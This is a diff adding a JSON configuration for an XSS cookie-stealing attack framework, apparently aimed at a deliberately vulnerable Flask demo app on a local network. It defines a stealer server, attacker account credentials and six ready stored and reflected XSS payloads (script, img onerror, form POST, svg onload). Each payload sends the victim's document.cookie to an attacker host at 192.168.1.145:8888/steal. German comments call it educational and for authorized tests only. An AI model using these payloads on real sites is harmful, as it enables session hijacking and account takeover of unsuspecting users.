@@ -1,0 +1,67 @@
+{
+  "target": {
+    "app_url": "http://192.168.1.188:5001",
+    "register_endpoint": "/register",
+    "login_endpoint": "/login",
+    "search_endpoint": "/search",
+    "users_endpoint": "/users",
+    "vulnerable_parameters": {
+      "bio_field": "bio",
+      "search_query": "q"
+    }
+  },
+  "stealer_server": {
+    "host": "0.0.0.0",
+    "port": 8888,
+    "endpoint": "/steal",
+    "log_file": "results/server_log.txt",
+    "cookie_output": "results/stolen_cookies.json"
+  },
+  "attack_settings": {
+    "injection_method": "stored",
+    "payload_type": "basic",
+    "victim_username": "test_victim",
+    "attacker_username": "xss_attacker",
+    "attacker_password": "malicious123",
+    "auto_cleanup": false,
+    "screenshot_on_success": false
+  },
+  "payloads": {
+    "stored_bio_basic": "<script>fetch('http://192.168.1.145:8888/steal?c='+encodeURIComponent(document.cookie))</script>",
+    "stored_bio_img": "<img src=x onerror=\"fetch('http://192.168.1.145:8888/steal?c='+encodeURIComponent(document.cookie))\">",
+    "stored_bio_form": "<script>var f=document.createElement('form');f.method='POST';f.action='http://192.168.1.145:8888/steal';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit();</script>",
+    "reflected_search_basic": "<script>location='http://192.168.1.145:8888/steal?c='+encodeURIComponent(document.cookie)</script>",
+    "reflected_search_img": "<img src=x onerror=\"location='http://192.168.1.145:8888/steal?c='+encodeURIComponent(document.cookie)\">",
+    "svg_based": "<svg onload=\"fetch('http://192.168.1.145:8888/steal?c='+encodeURIComponent(document.cookie))\"></svg>"
+  },
+  "_comments": {
+    "target": "Ziel-Webseite Konfiguration - 'Hebeln Mit Kopf' Demo-App",
+    "app_url": "Basis-URL der Flask-Anwendung",
+    "register_endpoint": "Registrierungs-Endpoint zum Injizieren von XSS-Payloads",
+    "login_endpoint": "Login-Endpoint für Opfer-Authentifizierung",
+    "search_endpoint": "Search-Endpoint mit Reflected XSS Vulnerability",
+    "users_endpoint": "Users-Seite wo Stored XSS ausgef\u00fchrt wird",
+    "vulnerable_parameters": "Parameter die XSS-anf\u00e4llig sind",
+    "stealer_server": "Cookie-Stealer Server Konfiguration",
+    "host": "Server Hostname (localhost f\u00fcr lokales Testing)",
+    "port": "Server Port (8888 f\u00fcr Cookie-Stealer)",
+    "endpoint": "Endpoint zum Empfangen gestohlener Cookies",
+    "log_file": "Pfad zur Server-Log-Datei",
+    "cookie_output": "Pfad zur JSON-Datei mit gestohlenen Cookies",
+    "attack_settings": "Angriffs-Konfiguration",
+    "injection_method": "Injektionsmethode: 'stored' (Bio-Feld) oder 'reflected' (Search)",
+    "payload_type": "Payload-Typ: 'basic', 'img', 'form', 'svg'",
+    "payloads": "XSS-Payload-Sammlung f\u00fcr verschiedene Angriffsvektoren"
+  },
+  "notes": {
+    "description": "XSS Cookie-Stealing Attack Framework",
+    "target_app": "Hebeln Mit Kopf - Vulnerable Flask Demo Application",
+    "attack_type": "Cross-Site Scripting (XSS) - Session Hijacking via Cookie Theft",
+    "xss_vectors": [
+      "Stored XSS via Bio-Feld (Prim\u00e4r)",
+      "Reflected XSS via Search Query-Parameter (Sekund\u00e4r)"
+    ],
+    "legal_notice": "\u26a0\ufe0f NUR f\u00fcr autorisierte Penetrationstests verwenden!",
+    "educational_purpose": "Dieses Tool dient ausschlie\u00dflich zu Bildungszwecken und darf nur in kontrollierten Test-Umgebungen verwendet werden."
+  }
+}
